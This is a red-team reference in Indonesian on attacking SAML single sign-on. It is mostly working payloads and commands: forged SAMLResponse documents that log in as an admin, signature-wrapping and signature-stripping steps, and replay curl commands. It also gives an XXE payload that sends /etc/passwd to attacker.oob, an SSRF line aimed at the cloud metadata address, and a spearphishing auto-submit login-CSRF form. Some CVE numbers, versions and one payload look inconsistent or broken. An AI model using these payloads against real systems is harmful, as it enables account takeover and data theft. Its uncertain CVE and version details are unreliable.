# saml — auth

# SAML SSO Attacks — Referensi Red Team

## 1. Model Ancaman & Titik Serang

Alur SAML Web Browser SSO (SP-Initiated):

```
Browser → SP (/saml/login) → IdP (/sso) → [authn] → POST SAMLResponse ke SP (/saml/acs) → SP buat session
```

Titik serang yang dicakup bab ini:

| # | Teknik | Target | Efek |
|---|--------|--------|------|
| 1 | XML Signature Wrapping (XSW 1–8) | SP | Bypass signature validation, injeksi Subject palsu |
| 2 | Signature Exclusion | SP | Assertion tanpa signature diterima |
| 3 | Comment Truncation | Parser XML SP | Bypass NameID check via komentar |
| 4 | XXE di Assertion | Parser XML SP | Baca file / SSRF / RCE (jarang; lihat §4) |
| 5 | Audience/Recipient Mismatch | SP | Token dari IdP lain / SP lain diterima |
| 6 | Replay | SP | Assertion dipakai ulang (InResponseTo/NotOnOrAfter lemah) |
| 7 | IdP-Initiated Abuse | SP | Unsolicited response diterima tanpa RequestID binding |
| 8 | Tooling | — | SAML Raider, saml-tool, python3-saml exploit |

Referensi kanonis: Somorovsky et al., *"On Breaking SAML: Be Whoever You Want to Be"* (USENIX Security 2012) — semua varian XSW di bawah mengacu ke sini.

---

## 2. XML Signature Wrapping (XSW)

**Apa yang dikirim:** SAMLResponse berisi signature valid (dari IdP asli, biasanya milik attacker atas akunnya sendiri), tapi logika SP memvalidasi node `Signature` terhadap reference yang *berbeda* dari node `Assertion` yang diproses sebagai identitas.

**Mengapa berhasil:** Parser XML dan validator signature beroperasi pada dua view berbeda (canonicalization, XPath selection, ID resolution). Jika SP memvalidasi "assertion pertama yang ditemukan via `getElementsByTagName('Assertion')[0]`", dan attacker menaruh assertion palsu di posisi yang berbeda dari yang di-sign, verifikasi lolos namun identitas diambil dari node palsu.

**Prasyarat:** Attacker punya akun sah di IdP yang sama (assertion asli) — atau assertion valid curian. Ini **post-auth escalation**, bukan unauth.

### 2.1 Tabel Varian XSW

Notasi struktur: `[S]` = node berisi `<ds:Signature>` valid; `[A]` = Assertion asli yang di-sign; `[E]` = Assertion evil (Subject attacker).

| Varian | Struktur | Yang divalidasi SP | Yang dipakai SP | Catatan kompatibilitas |
|--------|----------|--------------------|-----------------|------------------------|
| XSW-1 | `<Response>[S valid untuk A][A][E]</Response>` | A via Reference URI=#A | E (first/first-found) | Banyak SP rentan 2012–2016 |
| XSW-2 | `<Response><Extensions>[S][E]</Extensions>[A]</Response>` | A | E (di dalam Extensions) | SP yang iterate descendants |
| XSW-3 | `<Response>[S][E][A]</Response>` | A | E (assertion dengan Signature) | Signature ditempel ke E |
| XSW-4 | `<Response>[S][A][E dalam A? ]` (nested via Extensions di dalam A) | A | E (child Extensions milik A) | Butuh schema allowing Extensions |
| XSW-5 | `<Response>[S][A][E]/></Response>` (E sibling ber-Signature refer ke A) | A | E | Signature milik E reference A |
| XSW-6 | Multiple `<Assertion>` dengan Signature dipindah sibling | A | E | Bergantung resolusi ID |
| XSW-7 | `[S]` di dalam `<Object>` milik E, reference ke A | A | E | Object/SignatureProperties |
| XSW-8 | XML comment / namespace confusion + duplicate ID | A | E | Bypass ID uniqueness check |

**Catatan versi:** library Java `opensaml` 2.x rentan ke XSW-1..4; `opensaml` 3.x+ memperketat (one-assertion, ID uniqueness) tetapi misconfig `setRequireSignedResponse(true)` tanpa `setRequireSignedAssertion(true)` tetap rentan signature exclusion. `python3-saml` sebelum 1.9.0 rentan ke XSW-1/2. `ruby-saml` sebelum 1.12.2 rentan ke beberapa varian (CVE-2024-45409 — batch processing bypass, lihat §6). `node-saml`/`passport-saml` sebelum 4.0.0 rentan ke XSW klasik.

### 2.2 Payload XSW-1 (contoh mentah, SPI-Initiated)

```
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="R1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z"
                Destination="https://sp.internal/saml/acs"
                InResponseTo="REQ_ID_DARI_SP">
  <saml:Issuer>https://idp.internal/</saml:Issuer>
  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
    <!-- Signature ASLI, Reference URI = #A_ORIGINAL -->
  </ds:Signature>
  <saml:Assertion ID="A_ORIGINAL" IssueInstant="2025-01-01T00:00:00Z" Version="2.0">
    <saml:Issuer>https://idp.internal/</saml:Issuer>
    <saml:Subject><saml:NameID>attacker@corp</saml:NameID></saml:Subject>
    <!-- ... kondisi, audience, dll — milik attacker sendiri ... -->
  </saml:Assertion>
  <saml:Assertion ID="A_EVIL" IssueInstant="2025-01-01T00:00:01Z" Version="2.0">
    <saml:Issuer>https://idp.internal/</saml:Issuer>
    <saml:Subject><saml:NameID>admin@corp</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2025-01-01T00:00:00Z" NotOnOrAfter="2030-01-01T00:00:00Z">
      <saml:AudienceRestriction><saml:Audience>https://sp.internal/saml/acs</saml:Audience></saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement SessionIndex="s1" AuthnInstant="2025-01-01T00:00:01Z">
      <saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

**Apa yang muncul:** SP memverifikasi signature (valid, menunjuk ke `A_ORIGINAL`), lalu memproses assertion *pertama yang cocok filter* — pada implementasi rentan, pertama yang ditemukan tanpa `subject` filter = `A_EVIL`. Login sukses sebagai `admin@corp`.

**Mengapa bisa gagal:** SP modern memvalidasi *semua* Assertion (opensaml 3+ dengan `SignedElementFilter`), atau memakai `SAML2Utils.isSignedAssertionPresent` + mewajibkan reference URI tunggal. Satu-satunya jalan: cari SP lama/internal yang belum dipatch.

### 2.3 Langkah Burp (XSW via SAML Raider)

1. **Burp Proxy** intercept `POST /saml/acs` — parameter `SAMLResponse` (base64).
2. **SAML Raider** tab → *Load Response* → tampil XML decoded.
3. Aktifkan *Intercept* di SAML Raider, kelas `Response` → tahan.
4. Homepage SAML Raider → pilih **"Public key"** dari cert IdP (`/saml/metadata`) → *Load*.
5. Klik tombol **XSW** (kelompok varian V1–V8) — tool membangun payload dari assertion yang Anda pilih di tree view (drag `Assertion` target ke dua posisi berbeda).
6. **Send** → di Repeater, cek response: `302 /dashboard` + `Set-Cookie: JSESSIONID=...` = sukses; `403 Invalid signature` = gagal (varian salah).
7. Iterasi varian 1→8; catat mana yang mengembalikan 302 vs 400. Varian yang mengembalikan **500** = parser crash (indikasi retas, tapi bukan login).

**Perintah ekstraksi & repack di luar Burp:**

```bash
# decode
echo "$SAML_B64" | base64 -d | xmllint --format - > resp.xml
# repack
base64 -w0 resp.xml | sed 's/+/%2B/g;s/\//%2F/g;s/=/%3D/g' > resp.urlenc
curl -s -i -X POST https://sp.internal/saml/acs \
  --data-urlencode "RelayState=$RELAY" \
  --data-urlencode "SAMLResponse@resp.xml" \
  -b 'pre_saml_session=...' -c cookies.txt
```

---

## 3. Signature Exclusion

**Apa yang dikirim:** `SAMLResponse` tanpa `<ds:Signature>` sama sekali (atau Signature kosong), berisi `Assertion` evil.

**Mengapa berhasil:** SP hanya mewajibkan signature di `Response` (signed response, unsigned assertion), atau sebaliknya, atau tidak mewajibkan keduanya. Umum pada SP yang mengandalkan konfigurasi default library (mis. `node-saml` dengan `wantAssertionsSigned: false, wantAuthnResponseSigned: true` — attacker strip signature response dan kirim assertion polos bila jalur "trusted channel" dianggap).

**Payload minimal:**

```
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="R1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z" Destination="https://sp.internal/saml/acs" InResponseTo="REQ">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.internal/</saml:Issuer>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="A_EVIL" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
    <saml:Issuer>https://idp.internal/</saml:Issuer>
    <saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@corp</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2030-01-01T00:00:00Z" Recipient="https://sp.internal/saml/acs" InResponseTo="REQ"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2025-01-01T00:00:00Z" NotOnOrAfter="2030-01-01T00:00:00Z">
      <saml:AudienceRestriction><saml:Audience>https://sp.internal</saml:Audience></saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2025-01-01T00:00:00Z" SessionIndex="s"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>
```

**Langkah Burp:**
1. Intercept ACS POST.
2. SAML Raider → *Remove Signatures* (tombol) → hapus node `Signature`.
3. Ganti `NameID` → target.
4. Send. Kriteria sukses: 302 + cookie. Kriteria gagal: 400 `"No signature found"`.

**Varian eksploitasi umum:** library `ruby-saml` < 1.9.0 memiliki CVE-2020-15131 (audience bypass) dan `python3-saml` < 1.9.0 CVE-2020-15225. Uji kedua arah (signed Response/unsigned Assertion dan sebaliknya) — SP yang mewajibkan salah satunya tetap rentan ke sisi lain.

---

## 4. Comment Truncation

**Apa yang dikirim:** `NameID` berisi komentar XML untuk memotong nilai saat diproses oleh validator tertentu. Teknik asal: Kelby Ludwig (2018), *"SAML: Nested Comments"*.

**Mekanisme:** Beberapa library (mis. `python3-saml` lama memakai `lxml`, `xmlsec` ok) menormalisasi `text` node dengan memotong pada `<!--`. Attacker membuat `NameID` = `attacker@evil.com<!--` atau `admin@corp<!--x-->@attacker.com` sehingga validator melihat string yang berbeda dari yang dipakai SP untuk lookup.

**Contoh 1 — user confusion:**

```xml
<saml:NameID>admin@corp.com<!---->attacker@evil.com</saml:NameID>
```
Validator melihat `admin@corp.comattacker@evil.com` (concatenated) atau truncated ke `admin@corp.com` tergantung parser w3c `textContent` (yang *skip* comments) vs library custom.

**Contoh 2 — signature tetap valid, email berubah:**

Dengan `xmlsec1` 1.2.x, `text()` XPath mengembalikan seluruh text termasuk yang tidak berkomentar. Jika SP mengambil `NameID.textContent` (excludes comments) sebagai identitas dan xmlsec memvalidasi `text()` (includes comments concatenated), signature lolos sementara identitas terbaca lain.

**Langkah Burp:**
1. Intercept ACS, SAML Raider → *Edit* `NameID`.
2. Sisipkan `<!--...-->` di tengah atau akhir string.
3. Karena modifikasi mengubah canonicalization, **signature akan patah** — teknik ini hanya berlaku pada SP yang **tidak memverifikasi signature pada NameID/AttributeValue** (mis. signature di Response, data di Assertion unsigned, atau signature Reference URI ke node lain — kombinasikan dengan XSW).
4. Sukses: login sebagai user lain. Gagal: `400 Signature verification failed`.

**Kombinasi paling mematikan:** XSW-1 + NameID comment truncation → signature tetap valid (reference ke A_ORIGINAL), namun assertion evil memuat NameID `admin@corp<!--x-->` yang di-truncate SP ke `admin@corp`.

---

## 5. XXE di Assertion

**Status di 2025:** Sangat jarang. `lxml` modern (≥4.9) default `resolve_entities=False`; `xmlsec` tidak expand external entities; .NET `XmlDocument` sejak 4.5.2 default `XmlResolver=null`. Namun SP warisan (Java `DocumentBuilderFactory` tanpa `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`, PHP `DOMDocument::loadXML` tanpa `LIBXML_NOENT`, Go `encoding/xml` aman secara default) masih ada di internal.

**Apa yang dikirim:** DOCTYPE dalam Assertion. Jika SP memproses atribut atau Subject, XXE trigger saat parse.

**Payload OOB (blind, untuk exfil):**

```xml
<?xml version="1.0"?>
<!DOCTYPE saml:Assertion [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.oob/evil.dtd">
  %dtd;
]>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="A" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml:Issuer>https://idp.internal/</saml:Issuer>
  <saml:Subject><saml:NameID>&xxe;</saml:NameID></saml:Subject>
</saml:Assertion>
```

`evil.dtd` di server OOB (Burp Collaborator / interactsh):

```
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.oob/?d=%file;'>">
%all;
%send;
```

**Vektor lain:** parameter entity dalam `AuthnContextClassRef`; XXE via `RelayState` jika SP decode XML (langka). Untuk SSRF, ganti `SYSTEM "file:///..."` dengan `SYSTEM "http://169.254.169.254/latest/meta-data/"` — SP akan melakukan fetch.

**Langkah Burp:**
1. Kirim payload di atas, ganti `attacker.oob` dengan Collaborator payload.
2. Intercept ACS, inject `<!DOCTYPE ...>` setelah `<?xml ...?>` (butuh XML declaration utuh; SAML Raider kadang menghapus DOCTYPE — edit raw base64).
3. Cek Collaborator: DNS/HTTP hit = XXE confirmed. Isi exfil muncul di `?d=`.
4. Untuk file read tanpa OOB: gunakan error-based XEE (`file:///etc/passwd` di-trigger saat parser throw SAXParseException yang bocor ke response 500).

**Prasyarat konkret:** Java 8u191+ memblokir external DTD via `com.sun.org.apache.xerces` default kecuali di-drop; JDK 11 masih rentan bila `DocumentBuilderFactory` tidak dikonfigurasi. Node `libxmljs` < 0.19 rentan. PHP < 8.0 dengan `libxml_disable_entity_loader(false)` rentan.

---

## 6. Audience/Recipient Mismatch

**Apa yang dikirim:** Assertion diambil dari IdP/SP lain (biasanya attacker punya akun di SP_A, kirim ke SP_B), assertion `Audience` dan `SubjectConfirmationData@Recipient` di-*rewrite*.

**Dua sub-teknik:**

**(a) Audience bypass** — Assertion memiliki `<Audience>https://sp-A</Audience>` tapi dikirim ke SP-B. Bila SP-B tidak memeriksa audience (atau memeriksa hanya bila field hadir), login berhasil. Umum pada:
- `ruby-saml` < 1.12.x: `CVE-2020-15131` (audience tidak divalidasi saat `audience` array kosong di settings).
- `python3-saml` < 1.9.0: `CVE-2020-15225`.
- SP custom yang pakai `SAML2Utils.validateAudience` opsional.

**Payload:** ambil assertion kanonik dari SP-A (SP yang Anda kendalikan), POST ke SP-B `/saml/acs`:

```bash
# dari sesi attacker di SP-A
curl -s -b cookies_spA 'https://sp-a.internal/saml/login' -o req.html
# ekstrak SAMLResponse dari ACS POST (via Burp dari browser)
```

Lalu replay ke SP-B:
```bash
curl -s -i -X POST https://sp-b.internal/saml/acs \
  --data-urlencode "RelayState=" \
  --data-urlencode "SAMLResponse@sp_a_assertion.b64" -c /tmp/spB.txt
```

**Indikator sukses:** 302 + cookie SP-B; **gagal:** `400 Invalid audience` / `Invalid recipient`.

**(b) Recipient/InResponseTo bypass** — `SubjectConfirmationData@Recipient` = SP-A, dikirim ke SP-B; `InResponseTo` = request ID yang tidak cocok (atau kosong). Rentan bila SP tidak memvalidasi `InResponseTo` (unsolicited response path) atau tidak cross-check `Recipient` dengan URL ACS-nya.

**Payload — InResponseTo kosong:** hapus atribut `InResponseTo` dari `Response` dan `SubjectConfirmationData`. Jika SP menerima, artinya SP mendukung unsolicited (IdP-Initiated). Teknik ini = jembatan ke §7.

**Produsen yang rentan (versi konkret):**
- `ruby-saml` < 1.12.2 — CVE-2024-45409 (lihat §8, batch parsing).
- `opensaml` 3.x — `AudienceRestriction` opsional bila hanya ada `<Audience>` tunggal tanpa wrapper (banyak SP implementasi custom).
- `simplesamlphp` < 1.19.0 — CVE-2021-26120 (SQLi via attribute, bukan mismatch, tapi relevan untuk env ini).
- Keycloak < 21 — beberapa SP adapter tidak memeriksa recipient saat `idp-initiated` (config `validateResponseSignature` menyesatkan).

---

## 7. Replay

**Apa yang dikirim:** `Assertion` valid (signature utuh) di-replay ke SP yang sama atau SP lain di tenant yang sama, dalam jendela waktu valid.

**Kapan berhasil:**
- SP tidak menyimpan cache `Assertion ID` (banyak implementasi custom memakai `NotOnOrAfter` saja).
- `NotOnOrAfter` di masa depan jauh (mis. `2030`), sering ditemukan pada IdP test/dev.
- IdP-Initiated (tanpa `InResponseTo`) — SP tidak bisa membedakan replay dari request baru; hanya `NotOnOrAfter` + (mungkin) cookie session yang mencegah.

**Payload — replay assertion stolen:**

```bash
# dari traffic Victim (mitm/PCAP/access log SSO), ekstrak SAMLResponse
grep -oP 'SAMLResponse=\K[A-Za-z0-9+/=%]+' victim.log | head -1 | python3 -c 'import sys,urllib.parse,base64;print(base64.b64decode(urllib.parse.unquote(sys.stdin.read())).decode())'

# replay setelah strip InResponseTo
sed -i 's/ InResponseTo="[^"]*"//g' victim_assertion.xml
base64 -w0 victim_assertion.xml > replay.b64
curl -s -i -X POST https://sp.internal/saml/acs \
  --data-urlencode "SAMLResponse@replay.b64" -c /tmp/replay.txt
```

**Kondisi gagal:** SP memeriksa `InResponseTo` terhadap session `AuthnRequestID` (wajib untuk SP-Initiated), atau menyimpan store `Assertion ID` (mis. `opensaml` `ReplayCache` dengan Redis). Cek dengan me-replay 2× — jika kedua sukses, store tidak ada.

**Varian: cross-SP replay dalam tenant IdP yang sama** — assertion dari SP-A di-*audience rewrite* (butuh signature invalid → perlu strip signature atau gabung §3) atau dipakai ke SP-B yang audience check-nya lemah (§6a).

**Jendela waktu konkret:** Keycloak default `NotOnOrAfter=+5m`; ADFS default `+1h`; Okta default `+5m`. Assertion `NotOnOrAfter` enak dilihat di `<Conditions>` — kalau > 1 jam dari sekarang, prioritas replay tinggi.

---

## 8. IdP-Initiated Abuse

**Apa yang dikirim:** `SAMLResponse` *unsolicited* — tidak ada `InResponseTo`, dikirim langsung ke `/saml/acs` tanpa SP pernah mengirim AuthnRequest.

**Mengapa berhasil:** Banyak SP menerima unsolicited response untuk mendukung IdP-initiated flow (dashboard SSO). Bila SP melemahkan validasi dalam mode ini (skip `InResponseTo`, skip `Recipient`, atau tidak membedakan awal request), attacker dapat:

1. **Injeksi login:** Kirim assertion atas nama user (dari IdP milik attacker atau assertion curian) → SP membuat session tanpa perlu request browser pengguna.
2. **Login CSRF:** Kirim link `https://sp.internal/saml/acs` berisi `SAMLResponse=...` yang berisi Subject attacker; korban membuka → session korban terikat ke akun attacker (session fixation via SSO), korban melakukan aksi di akun attacker → data leak / privilege abuse.
3. **Bypass MFA:** Bila IdP mengeluarkan assertion tanpa `AuthnContext` MFA untuk flow tertentu (mis. remembered device), assertion tersebut di-replay ke SP yang mewajibkan MFA hanya di flow SP-Initiated.

**Payload unsolicited minimal:**

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="R_unsolicited" Version="2.0" IssueInstant="2025-01-01T00:00:00Z" Destination="https://sp.internal/saml/acs">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.internal/</saml:Issuer>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="A_uns" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
    <saml:Issuer>https://idp.internal/</saml:Issuer>
    <saml:Subject><saml:NameID>victim_target</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2030-01-01T00:00:00Z" Recipient="https://sp.internal/saml/acs"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2025-01-01T00:00:00Z" NotOnOrAfter="2030-01-01T00:00:00Z">
      <saml:AudienceRestriction><saml:Audience>https://sp.internal/saml/acs</saml:Audience></saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement SessionIndex="uns" AuthnInstant="2025-01-01T00:00:00Z"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>
```

**Langkah Burp:**
1. Repeater → POST `/saml/acs`, body `SAMLResponse=<base64 payload>` (tanpa `RelayState`).
2. Jika 302 + `Set-Cookie` → SP menerima unsolicited. Jika 400 `"Unsolicited response rejected"` → tidak.
3. Untuk login CSRF: siapkan HTML di server attacker:
   ```html
   <form action="https://sp.internal/saml/acs" method="POST" id="f">
     <input name="SAMLResponse" value="BASE64">
     <input name="RelayState" value="/admin">
   </form><script>f.submit()</script>
   ```
   Kirim ke korban (spearphish). Korban yang membuka akan login sebagai `victim_target` di SP.

**Batas:** SP dengan `wantAssertionsSigned=true` memerlukan signature valid — jadi butuh IdP yang menandatangani assertion attacker (attacker punya akun di IdP yang sama) atau assertion curian. IdP-initiated abuse paling relevan pada multi-tenant SaaS B2B SSO.

---

## 9. Tooling

| Tool | Versi | Fungsi | Profil |
|------|-------|--------|--------|
| **SAML Raider** (Burp BApp) | 2.0.x (2024) | Decode/encode SAML, XSW varian V1–V8, hapus signature, edit cert, set proxy cert | Wajib di Kali/Burp 2024.10+ |
| **saml-tool** (pycryptoki) | 1.1.0 | Craft/verify/attack XML Signature — CLI, kontrol penuh canonicalization | Skrip otomatis XSW custom |
| **python3-saml** | 1.16.0 | Validator SP (untuk test *listener* sendiri) | Bukan attacker tool, tapi sering di-patch SP |
| **xmlsec1** | 1.2.37 | CLI sign/verify untuk debug signature reference | Debug XSW |
| **SAMLify** (Node) | 2.8.x | Test SP penerimaan | Lingkungan JS |
| **Ruby-saml exploit** | — | PoC CVE-2024-45409 (batch/signature bypass) | Lihat §10 |

### 9.1 SAML Raider — alur singkat

```
Burp → Extender → BApp Store → SAML Raider (install)
Proxy → Intercept SAMLResponse → SAML Raider tab
Klik "Load Response" → tree XML tampil
Homepage SAML Raider: "Certificate" → load IdP cert (dari /saml/metadata atau WS-Fed metadata)
Toggle "Intercept class: Response"
Di tree: drag Assertion → pilih varian XSW dari dropdown (V1..V8) → Build
Send → Repeater → cek 302
```

SAML Raider juga menyediakan **"Remove signatures"** (signature exclusion), **"Remove/Inject comment"** (comment truncation), **"Add/Remove InResponseTo"** (unsolicited test), **"Convert to IdP-Initiated"** (hapus `InResponseTo`, isi Recipient).

### 9.2 saml-tool (CLI)

`saml-tool` (PyPI `saml-tool` 1.1.0, bukan `SAMLTool` Kapetanios yang beda) mendukung generate/verify/sign. Untuk XSW:

```bash
# 1. decode assertion attacker
echo "$ATTACKER_B64" | base64 -d > attacker.xml

# 2. sign ulang (butuh private key attacker — tapi untuk XSW kita pakai signature asli)
# tidak perlu sign ulang untuk XSW: reference URI tetap ke A_ORIGINAL

# 3. craft XSW-1 via python (bukan saml-tool langsung; script custom)
python3 xsw.py --in attacker.xml --evil-name admin@corp --variant 1 --out evil.xml

# 4. verify lokal (opsional)
xmlsec1 --verify --pubkey-cert-pem idp.pem evil.xml 2>&1 | head

# 5. base64 + POST
base64 -w0 evil.xml | curl -s -i -X POST https://sp.internal/saml/acs \
  --data-urlencode "SAMLResponse@-" -b pre.txt -c post.txt
```

**Contoh `xsw.py` (XSW-1 builder) — potongan kunci:**

```python
import re, sys
def xsw1(xml, evil_name):
    # pastikan Response punya Signature; extract base64 assertion attacker sebagai A_EVIL
    m = re.search(r'<saml:Assertion ID="([^"]+)".*?</saml:Assertion>', xml, re.S)
    a_orig = m.group(0)
    a_evil = re.sub(r'<saml:NameID[^>]*>.*?</saml:NameID>',
                    f'<saml:NameID>{evil_name}</saml:NameID>', a_orig)
    a_evil = re.sub(r'ID="[^"]+"', 'ID="A_EVIL"', a_evil, count=1)
    # sisipkan A_ORIGINAL dulu (referenced by signature), lalu A_EVIL
    return xml.replace(m.group(0), a_orig + a_evil)
```

### 9.3 CVE yang perlu dicek di fingerprint SP

| CVE | Produk | Dampak |
|-----|--------|--------|
| CVE-2024-45409 | `ruby-saml` < 1.12.2 / 1.17.0 | Signature bypass via `get_id` XPath injection (batch processing) — authn sebagai user mana pun |
| CVE-2020-15131 | `ruby-saml` < 1.9.0 | Audience bypass |
| CVE-2020-15225 | `python3-saml` < 1.9.0 | Audience bypass |
| CVE-2021-26120 | `simplesamlphp` < 1.19.0 | SQLi (attribute) |
| CVE-2022-42728 | `opensaml-java` (lewat `xmltooling`) | DoS, bukan authn |
| CVE-2023-28709 | `Apache Tomcat` 9.0.0–9.0.73 | Bukan SAML, tapi sering jadi SP container — cek versi bila ada stack trace |
| CVE-2017-11427 | `python-saml` | XSW-1/2 (generasi lama) |

**Fingerprint SP tanpa scan:** kirim `SAMLResponse=` kosong, baca stack trace/error 400. Java/opensaml → `org.opensaml...`

## [lanjutan]

## Varian XSW Lanjutan (di luar XSW #1–#8 klasik)

Varian klasik Somorovsky/Bauer mencakup 8 pola (signature tetap pada objek asli, attacker menyisipkan assertion palsu di posisi yang diproses berbeda oleh parser). Yang sering terlewat di lapangan:

- **XSW di level Response vs Assertion**: signature melekat pada `<Response>` tapi aplikasi memvalidasi `<Assertion>` (atau sebaliknya). Pola "signature wrapping Response" memungkinkan mengganti assertion di dalam Response yang ditandatangani tanpa menyentuh byte signature.
- **Namespace confusion**: dua elemen `<Assertion>` dengan namespace berbeda (`saml:` vs `samlp:` vs default) — validator memilih satu, business logic membaca yang lain (parsing differential).
- **Duplicate ID**: dua elemen dengan `ID` sama; XML Signature reference resolve ke yang pertama (sesuai spec), aplikasi mengambil yang terakhir (atau sebaliknya via DOM vs SAX). Ini basis XSW #7/#8 tapi sering muncul sebagai bug produk nyata.
- **Extension/schema laxness**: menyisipkan `<Extensions>` berisi assertion kedua; sebagian parser (mis. yang pakai `lxml` dengan `recover=True`) tetap memprosesnya.
- **Signature di `<Advice>`/`<Conditions>`**: beberapa library hanya memeriksa keberadaan signature di subtree, bukan lokasi wajibnya.

Tabel cepat pemilihan varian berdasarkan perilaku target:

| Gejala target | Varian yang dicoba |
|---|---|
| Menerima Response bertanda tangan, membaca Assertion | XSW Response-wrapping |
| Error "duplicate ID" tapi tetap login di edge case | Duplicate ID + urutan node |
| Lolos jika assertion di `<Extensions>` | Extension injection |
| Lolos saat namespace diubah | Namespace confusion |
| Validasi hanya cek presence signature | Signature exclusion |

## Signature Exclusion — Edge Case Modern

- **Unsigned Assertion di Signed Response**: banyak implementasi hanya memverifikasi signature di Response, mengabaikan bahwa assertion di dalamnya tidak ditandatangani. Uji: hapus `<Signature>` pada Assertion, pertahankan di Response.
- **Signature dengan `Reference URI=""`** (enveloped whole-document) — sebagian validator menganggap seluruh dokumen tertandatangani padahal attacker bisa menambah sibling di luar root yang diproses aplikasi.
- **Algorithm `none` / `rsa-sha1` lemah**: walau spec melarang, beberapa library lama menerima `http://www.w3.org/2000/09/xmldsig#rsa-sha1` atau bahkan tidak memvalidasi `SignatureMethod` terhadap allowlist. Cek juga `DigestMethod` (`sha1` masih diterima di banyak IdP enterprise).
- **KeyInfo injection**: mengganti `<KeyInfo>` dengan `<X509Certificate>` attacker-controlled saat SP tidak mem-pin cert IdP. Varian: `RetrievalMethod` menunjuk URL eksternal (SSRF + trust bypass).
- **Multiple `<Signature>`**: satu valid (dibuang), satu invalid (dipakai) — validator "first signature wins", aplikasi "last wins".

## Comment Truncation & Parser Differential

- **XML comment truncation** (CVE-2017-1164 dsb.): validator memotong nilai setelah `<!--` sehingga `admin<!--x-->@evil.com` dilihat sebagai `admin` oleh satu parser dan `admin@evil.com` oleh parser lain. Uji NameID/audience/recipient dengan injeksi komentar.
- **CDATA vs entity**: `admin@evil.com` vs `<![CDATA[admin]]>@evil.com` — perbedaan normalisasi.
- **Whitespace & Unicode normalization**: `admin@evil.com` vs `admin@evil.com\u0000` vs NFKC (`admin@ｅvil.com`) — mismatch antara IdP-side normalizer dan SP-side comparator.
- **Billion laughs / quadratic blowup** di assertion (DoS) — bukan auth bypass tapi sering jadi temuan; batasi entity expansion di laporan.

## XXE di Assertion — Konteks SAML

XXE di SAML jarang di Response utama (karena signature), tapi muncul di:
- **`<AttributeValue>` bertipe XML** (mis. `xsi:type="xs:anyType"`) — SP mem-parse attribute sebagai XML.
- **Metadata import**: SP mengimpor metadata IdP attacker-supplied → XXE di parser metadata (endpoint `/saml/metadata` import, SAML admin console).
- **SAML Artifact Resolution**: body SOAP ArtifactResolve di-parse tanpa hardening.
- **LogoutRequest/LogoutResponse** (tidak selalu ditandatangani) — sering jadi vektor XXE/SSRF.

Payload minimal di AttributeValue:

```xml
<saml:AttributeValue xsi:type="xs:anyType">
  <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
  <r>&x;</r>
</saml:AttributeValue>
```

Jika output attribute dirender di UI (profil user, admin panel) → exfil. Untuk OOB:

```xml
<!ENTITY % p SYSTEM "http://attacker/oob.dtd"> %p;
```

## Audience / Recipient / Destination Mismatch

- **Audience kosong atau wildcard**: `<AudienceRestriction>` absen, atau `Audience` berisi `*`/URL attacker. Uji assertion dari tenant A ke SP tenant B (multi-tenant SP).
- **Recipient vs Destination**: `SubjectConfirmationData@Recipient` harus sama dengan ACS URL. Banyak SP hanya cek `Destination` di Response, bukan `Recipient` di SubjectConfirmation.
- **`InResponseTo` hilang** pada flow SP-initiated → buka peluang replay/IdP-initiated injection.
- **NotOnOrAfter/NotBefore**: clock skew lebar (mis. ±5 menit) + replay window. Uji assertion dengan `NotOnOrAfter` di masa lalu + `Recipient` beda path (`/acs` vs `/acs/`).
- **Multi-ACS SP**: satu SP punya beberapa ACS (mobile/web). Assertion untuk ACS A diterima di ACS B jika audience sama.

Tabel mismatch dan dampak:

| Field | Dampak jika tidak divalidasi |
|---|---|
| Audience | Cross-tenant / cross-SP token reuse |
